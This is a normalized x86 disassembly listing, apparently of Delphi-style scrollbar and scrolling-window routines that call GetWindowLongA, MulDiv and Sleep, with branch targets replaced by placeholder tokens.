push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_427ae4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_456e98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4575cc
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4431c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4575cc
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44318c
call sub_456e30
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44318c
call sub_456dc4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_456f44
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4464d0
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_456f7c
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_456fb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_456f7c
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_456f7c
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_45702c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_456fb0
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f6b4
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_456fb0
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43f6f8
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4570c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_457124
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4572f5 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45702c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45702c
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_457494
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
push ebp
call sub_4570c4
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
push ebp
call sub_4570c4
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c94
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457494
jmp r-xdata
sub_45741c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_457b0c
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_457494
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4464d0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4464d0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_446050
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_446050
jmp r-xdata
call sub_456c04
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_457558
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_457b0c
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_457610
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call sub_42a558
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call sub_42a558
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call sub_42a558
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41ffac
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call sub_42a558
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
call sub_42a558
sub_457718
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45702c
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45702c
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_457610
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4464d0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_457494
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_45702c
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_457830
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4421c4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_456cac
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_456cac
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4578a8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032e8
mov eax [ esi + 0x20c ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4422e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4578f4
push ebx
mov ebx eax
mov eax ebx
call sub_443450
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_457b0c
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c050
test al al
jne r-xdata
mov eax ebx
call sub_4464d0
push eax
call sub_42a58c
sub_457934
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_457a8c
mov ecx edi
mov edx esi
mov eax ebx
call sub_442b98
pop edi
pop esi
pop ebx
retn
sub_457974
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457a7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f6b4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_456f44
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_457494
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44318c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44318c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_417414
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43f420
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a83
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_456d8c
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_417570
xor ecx ecx
mov edx 0xb03e
call sub_440e64
inc ebx
dec esi
jne r-xdata
sub_457ab0
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4575e4
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4575e4
mov eax ebx
call sub_457a8c
jmp r-xdata
sub_457b0c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
xor eax eax
push ebp
push sub_457bf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4570ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4570ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_457718
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_457718
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_457718
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_457718
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_457718
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_457718
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_457c1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43f7c8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43f7f4
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43f7c8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43f7f4
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43f6b4
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457494
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43f6b4
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43f6f8
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457494
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43f6b4
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_457494
mov eax ebx
call sub_43f6b4
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43f6f8
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43f6f8
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_457494
mov eax ebx
call sub_43f6f8
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_457d70
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_457494
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_457494
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4575e4
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4575e4
sub_457e14
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_457d70
mov ecx edi
mov edx esi
mov eax ebx
call sub_445fa4
pop edi
pop esi
pop ebx
retn
sub_457e3c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_457ea6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444a84
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457ead
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_457ead
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_457ee5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_457a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457eec
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_457eec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_457b0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_457f60
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f6f8
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_427ae4
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43f6b4
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_427ae4
mov ecx eax
